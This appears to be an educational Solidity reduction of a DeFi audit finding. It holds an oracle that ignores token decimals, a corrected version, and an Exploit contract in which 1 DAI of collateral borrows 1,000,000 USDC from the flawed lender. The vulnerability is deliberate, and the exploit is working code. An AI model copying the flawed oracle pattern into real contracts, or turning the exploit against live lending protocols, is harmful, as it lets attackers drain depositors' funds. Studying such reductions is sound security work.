// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Omo — OmoOracle.getUSDValue ignores token decimals
    (Pashov Audit Group, finding #53324, H-06)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: getUSDValue normalizes the price-feed decimals to 1e18 and then
    does (amount * normalizedPrice) / 1e18. It never divides by 10**token.decimals().
    A 6-decimal token is priced as if it had 18 decimals, so its USD value is
    10**(18-decimals) too small. A lender that compares collateral and debt with
    that value lets 1 DAI borrow 1_000_000 USDC.

    The three quoted lines are verbatim (@> VULN on the return). */

interface IPriceFeed {
    function decimals() external view returns (uint8);
    function latestAnswer(address token) external view returns (int256);
}

contract PriceFeed is IPriceFeed {
    uint8 public decimals = 8;
    mapping(address => int256) public answers;

    function setAnswer(address token, int256 answer) external {
        answers[token] = answer;
    }

    function latestAnswer(address token) external view returns (int256) {
        return answers[token];
    }
}

contract MockToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OmoOracle {
    IPriceFeed public priceFeed;

    constructor(IPriceFeed feed) {
        priceFeed = feed;
    }

    function getUSDValue(address token, uint256 amount) public view returns (uint256) {
        int256 price = priceFeed.latestAnswer(token);
        uint8 decimals = priceFeed.decimals();
        uint256 normalizedPrice = uint256(price) * 1e18 / 10 ** decimals;
        // @> VULN: divides by 1e18, not by 10**token.decimals(); non-18-decimal amounts are mis-scaled
        return (amount * normalizedPrice) / 1e18;
    }
}

contract OmoOracleFixed {
    IPriceFeed public priceFeed;

    constructor(IPriceFeed feed) {
        priceFeed = feed;
    }

    /// @dev Report formula: scale the amount into 18-decimal USD using the token's own decimals.
    function getUSDValue(address token, uint256 amount) public view returns (uint256) {
        int256 price = priceFeed.latestAnswer(token);
        uint8 priceDecimals = priceFeed.decimals();
        uint8 tokenDecimals = MockToken(token).decimals();
        return amount * uint256(price) * 1e18 / (10 ** priceDecimals) / (10 ** tokenDecimals);
    }
}

contract Lender {
    OmoOracle public oracle;
    MockToken public collateralToken;
    MockToken public debtToken;
    mapping(address => uint256) public collateralOf;
    mapping(address => uint256) public debtOf;

    constructor(OmoOracle oracle_, MockToken collateralToken_, MockToken debtToken_) {
        oracle = oracle_;
        collateralToken = collateralToken_;
        debtToken = debtToken_;
    }

    function deposit(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateralOf[msg.sender] += amount;
    }

    function borrow(uint256 amount) external returns (uint256) {
        uint256 collateralUsd = oracle.getUSDValue(address(collateralToken), collateralOf[msg.sender]);
        uint256 debtUsd = oracle.getUSDValue(address(debtToken), debtOf[msg.sender] + amount);
        require(collateralUsd >= debtUsd, "undercollateralized");
        debtOf[msg.sender] += amount;
        debtToken.transfer(msg.sender, amount);
        return amount;
    }
}

contract LenderFixed {
    OmoOracleFixed public oracle;
    MockToken public collateralToken;
    MockToken public debtToken;
    mapping(address => uint256) public collateralOf;
    mapping(address => uint256) public debtOf;

    constructor(OmoOracleFixed oracle_, MockToken collateralToken_, MockToken debtToken_) {
        oracle = oracle_;
        collateralToken = collateralToken_;
        debtToken = debtToken_;
    }

    function deposit(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        collateralOf[msg.sender] += amount;
    }

    function borrow(uint256 amount) external returns (uint256) {
        uint256 collateralUsd = oracle.getUSDValue(address(collateralToken), collateralOf[msg.sender]);
        uint256 debtUsd = oracle.getUSDValue(address(debtToken), debtOf[msg.sender] + amount);
        require(collateralUsd >= debtUsd, "undercollateralized");
        debtOf[msg.sender] += amount;
        debtToken.transfer(msg.sender, amount);
        return amount;
    }
}

contract Exploit {
    uint256 public constant ONE_DAI = 1e18;
    uint256 public constant ONE_USDC = 1e6;
    uint256 public constant BORROW_USDC = 1_000_000e6;
    int256 public constant USD_PRICE = 1e8;

    PriceFeed public feed; // CREATE nonce 1
    MockToken public dai; // CREATE nonce 2
    MockToken public usdc; // CREATE nonce 3
    OmoOracle public oracle; // CREATE nonce 4
    OmoOracleFixed public fixedOracle; // CREATE nonce 5
    Lender public lender; // CREATE nonce 6
    LenderFixed public fixedLender; // CREATE nonce 7

    uint256 public buggyDebtUsd;
    uint256 public fairDebtUsd;
    uint256 public buggyColUsd;
    uint256 public fairColUsd;
    uint256 public usdcOut;

    constructor() {
        feed = new PriceFeed();
        dai = new MockToken("Dai", "DAI", 18);
        usdc = new MockToken("USD Coin", "USDC", 6);
        oracle = new OmoOracle(feed);
        fixedOracle = new OmoOracleFixed(feed);
        lender = new Lender(oracle, dai, usdc);
        fixedLender = new LenderFixed(fixedOracle, dai, usdc);
        feed.setAnswer(address(dai), USD_PRICE);
        feed.setAnswer(address(usdc), USD_PRICE);
    }

    function run() external {
        dai.mint(address(this), ONE_DAI);
        dai.approve(address(lender), ONE_DAI);
        lender.deposit(ONE_DAI);
        usdc.mint(address(lender), BORROW_USDC);
        buggyDebtUsd = oracle.getUSDValue(address(usdc), BORROW_USDC);
        fairDebtUsd = fixedOracle.getUSDValue(address(usdc), BORROW_USDC);
        buggyColUsd = oracle.getUSDValue(address(dai), ONE_DAI);
        fairColUsd = fixedOracle.getUSDValue(address(dai), ONE_DAI);
        usdcOut = lender.borrow(BORROW_USDC);
        require(buggyDebtUsd == 1e12, "buggy debt usd");
        require(fairDebtUsd == 1e24, "fair debt usd");
        require(buggyColUsd == 1e18, "buggy collateral usd");
        require(fairColUsd == 1e18, "fair collateral usd");
        require(buggyColUsd >= buggyDebtUsd, "buggy check did not pass");
        require(fairColUsd < fairDebtUsd, "fair check would not reject");
        require(usdcOut == BORROW_USDC, "borrow amount");
        require(usdc.balanceOf(address(this)) == BORROW_USDC, "attacker usdc");
    }
}
